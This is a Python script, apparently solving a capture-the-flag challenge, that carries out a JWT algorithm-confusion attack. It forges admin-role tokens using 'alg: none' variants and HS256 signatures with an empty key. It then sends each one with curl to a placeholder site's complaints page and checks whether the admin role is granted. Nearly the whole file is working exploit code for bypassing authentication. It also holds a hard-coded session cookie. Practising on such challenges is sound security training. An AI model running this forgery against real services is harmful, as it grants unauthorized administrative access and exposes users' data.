#!/usr/bin/env python3
"""
Desafío «Funa en el Bloc C» — ataque de confusión de algoritmos JWT.

El panel de sesión dice: «El servidor confía en lo que declara el campo alg
del header para decidir cómo debe verificarlo.»

Variantes probadas:
  1. alg=none con firma vacía (y sin punto final)
  2. alg=None / NONE / nOnE
  3. HS256 firmado con clave vacía
  4. HS256 con la firma original (payload alterado)
"""
import base64
import hashlib
import hmac
import json
import subprocess

COOKIE = "trama_session=h1VKBwbj5fd2y9kKmlmtHKuvSRvGNPtZ9sJODeI7BpN7otZM5b2ZRaw5H8q-CVcQ"
BASE = "https://<host>"


def b64(d: bytes) -> str:
    return base64.urlsafe_b64encode(d).decode().rstrip("=")


def token(header: dict, payload: dict, firma: bytes = b"", con_punto=True) -> str:
    h = b64(json.dumps(header, separators=(",", ":")).encode())
    p = b64(json.dumps(payload, separators=(",", ":")).encode())
    s = b64(firma).rstrip("=")
    return f"{h}.{p}.{s}" if con_punto else f"{h}.{p}"


ADMIN = {"user": "admin", "nombre": "Administración", "depto": "ADMIN", "role": "admin"}

variantes = {
    "none_firma_vacia": token({"alg": "none", "typ": "JWT"}, ADMIN, b"", True),
    "none_sin_punto": token({"alg": "none", "typ": "JWT"}, ADMIN, b"", False),
    "None_firma_vacia": token({"alg": "None", "typ": "JWT"}, ADMIN, b"", True),
    "NONE_firma_vacia": token({"alg": "NONE", "typ": "JWT"}, ADMIN, b"", True),
    "hs256_clave_vacia": token({"alg": "HS256", "typ": "JWT"}, ADMIN, b"", True),
}

# HS256 firmado con la clave vacía (correcto)
h = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
p = b64(json.dumps(ADMIN, separators=(",", ":")).encode())
firma = hmac.new(b"", f"{h}.{p}".encode(), hashlib.sha256).digest()
variantes["hs256_hmac_vacia"] = f"{h}.{p}.{b64(firma)}"

for nombre, tok in variantes.items():
    r = subprocess.run(["curl", "-s", "-m", "20", "-b", f"{COOKIE}; vecino_token={tok}",
                        f"{BASE}/denuncias"], capture_output=True, text=True)
    html = r.stdout
    rol = "admin" if "Rol actual: admin" in html else ("vecino" if "Rol actual: vecino" in html else "?")
    print(f"{nombre:22s} len={len(html):6d} rol={rol:7s} "
          f"borrador={'BORRADOR' in html.upper() or 'borrador' in html}")
    print(f"   token: {tok[:90]}...")
